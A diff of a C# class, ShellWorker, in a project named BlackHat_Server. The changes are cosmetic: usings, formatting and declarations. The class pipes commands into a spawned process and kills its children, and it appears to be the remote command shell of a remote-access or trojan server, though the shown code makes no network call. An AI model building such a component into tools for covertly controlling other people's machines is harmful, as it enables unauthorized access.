@@ -1,20 +1,17 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Text;
 
 namespace BlackHat_Server
 {
-    class ShellWorker
+    internal class ShellWorker
     {
-        public  string sCmdComplete = "BC_Shell_End"; // QUESTA LINEA MI INDICA CHE IL COMANDO è STATO CONCLUSO
-
         private Process _process;
-        public event DataReceivedEventHandler StdOut = null;
-        public event DataReceivedEventHandler StdError = null;
+        public string sCmdComplete = "BC_Shell_End"; // QUESTA LINEA MI INDICA CHE IL COMANDO è STATO CONCLUSO
+        public event DataReceivedEventHandler StdOut;
+        public event DataReceivedEventHandler StdError;
 
         /// <summary>
-        /// Inizializzazione
+        ///     Inizializzazione
         /// </summary>
         public bool Initialize()
         {
@@ -66,20 +63,18 @@ namespace BlackHat_Server
             {
                 return false;
             }
-
-           
         }
         //-------------
 
         /// <summary>
-        /// Esegue il comando
+        ///     Esegue il comando
         /// </summary>
         /// <param name="command">The command.</param>
         public void Execute(string command)
         {
             try
             {
-                if (_process == null || (StdOut == null && StdError == null) || _process.HasExited)
+                if (_process == null || StdOut == null && StdError == null || _process.HasExited)
                 {
                     if (_process != null)
                         Terminate();
@@ -94,15 +89,13 @@ namespace BlackHat_Server
                     _process.StandardInput.WriteLine("@echo " + sCmdComplete); // fine comandi
                 }
             }
-            catch 
+            catch
             {
-                                
             }
-            
         }
 
         /// <summary>
-        /// termina processi
+        ///     termina processi
         /// </summary>
         public void Terminate()
         {
@@ -111,26 +104,25 @@ namespace BlackHat_Server
                 if (_process == null || _process.HasExited)
                     return;
 
-                Process[] processes = Process.GetProcesses();
-                foreach (Process process in processes)
-                {
+                var processes = Process.GetProcesses();
+                foreach (var process in processes)
                     try
                     {
                         var pfc = new PerformanceCounter("Process", "Creating Process Id", process.ProcessName);
-                        if ((int)pfc.RawValue == _process.Id)
+                        if ((int) pfc.RawValue == _process.Id)
                             process.Kill();
                     }
-                    catch { continue; /* Move on to the next process. */}
-                }
+                    catch
+                    {
+                    }
 
                 _process.Kill();
                 _process.Close();
                 _process = null;
             }
-            catch 
+            catch
             {
             }
-            
         }
     }
 }
